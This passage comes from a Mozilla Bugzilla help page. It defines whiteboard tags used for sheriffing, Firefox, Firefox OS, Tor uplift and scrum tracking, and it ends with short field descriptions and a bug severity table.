* `[test disabled]`: Indicates an automated test has been disabled. Typically used in bugs filed for intermittent test failures, to indicate that the absence of new failures in the bug is due to the test being disabled - as well as remind module owners that the test needs fixing and re-enabling.

## Autonag

`[no-nag]`: Indicates that a bug should not be modified or commented in by our [Autonag](/Release_Management/autonag "Release Management/autonag") scripts.

## Release Engineering

* `[capacity]`: This bug will help increase (or free up) capacity for our automated build & test machines.

## Sheriffing

* `[leave open]`: This has [been deprecated](https://groups.google.com/forum/#!topic/mozilla.dev.platform/Ie9OXcWbTSs) in favour of the 'leave-open' keyword. Used to ensure that the bug updating tool mcMerge does not close the bug when commits referencing it are merged into mozilla-central.
* `[retriggered]`: Used by sheriffs when investigating Fresh Oranges [[1]](https://charts.mozilla.org/FreshOranges/index.html) to find where a failure started from, using backfills and retriggers

## Firefox

* `dupeme`, `dupme`, or `DUPEME`: we're pretty sure this bug report is a duplicate of another bug, but cannot recall which one or cannot find it.
* `[qa-]`: QE (Quality Engineering) verification not required - superseded by the qe-verify flag.
* `[adv-mainNN+]` (where `NN` is some number): a security advisory about this bug for the release `NN` will be (has been) written.
* `[MemShrink]`: [a project](/Performance/MemShrink "Performance/MemShrink") to reduce memory consumption.

## Community reported bugs

* `[nightly-community]`: This bug was reported by a member of the Firefox Nightly community. Used to triage community-reported bugs and measure the impact of our core community on product quality.
* `[mozfr-community]`: This bug was reported by a member of the MozFR French-speaking community. Used to evaluate the impact of the mozfr.org community on product quality.

## Firefox OS

[Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes](/index.php?title=Template:Note:_This_project_is_no_longer_active,_but_we_leave_these_definitions_for_bug_tracker_historian_purposes&action=edit&redlink=1 "Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes (page does not exist)")

* `[POVB]`: Part of vendor build; the fix of this bug is not in the Mozilla codebase, but it's in our interest to track it.
* `[priority]`: Indicates we are asked by a partner to address this issue with priority.
* `[tarako_only]`: Special pref or feature that only lands on branch for Tarako (low memory phone), i.e. 1.3T branch of Gaia and Gecko. To be picked up on future releases.
* `[p=]/[u=]/[c=]/[s=]`: See [Scrum Development](/BMO/Whiteboard#Scrum_Development "BMO/Whiteboard"). Firefox OS uses the u= tag as the milestone instead, see [Firefox OS Performance Triage](/FirefoxOS/Performance/Triage#Scrumbugs_Tags "FirefoxOS/Performance/Triage")
* `[ft:<name of the team>]`, `[systemsfe]`, etc: Bugs identified to be owned by a "functional team" within B2G engineering. Each team owns a specific set of Bugzilla components, and tags are used to denote owned bugs outside of these components.

## Tor

* `[tor ###]` Part of the [Tor uplift project](/Security/Tor_Uplift/Tracking "Security/Tor Uplift/Tracking"). For example, `[tor 16620]` indicates a corresponding ticket at <https://trac.torproject.org/16620>. See also <https://torpat.ch/uplift>

## Web Compatibility

[Our whiteboard keywords](/Compatibility/BugsGuide "Compatibility/BugsGuide") are already described.

## Scrum Development

The following flags are used by tools like [scrumbu.gs](https://scrumbu.gs/help/) for managing sprints using the scrum development framework:

* `[p=]`: A rough estimate from engineer on how long the bug is going to take.
* `[u=]`: The user (in the scrum sense) that this story affects
* `[c=]`: The component (in the scrum sense) that this story affects
* `[s=]`: An explicit sprint slug this bug should belong to.

If you are not managing a product, you probably don't have to set these.

## What does this whiteboard keyword mean?

If you know what one of the following whiteboard keywords means, please describe it and put it into one of the above categories above (or create a new one):

* `[2.0-FL-bug-bash]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1021384>)
* `[games]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1017892>)
* `[reserve-photon-structure]` ([examples](https://bugzilla.mozilla.org/buglist.cgi?list_id=14108939&status_whiteboard_type=substring&status_whiteboard=%5Breserve-photon-structure%5D&order=Bug%20Number&query_format=advanced))
* `[TCP]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=920036>)
  + my guess: Tablet Contribution Program?

Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
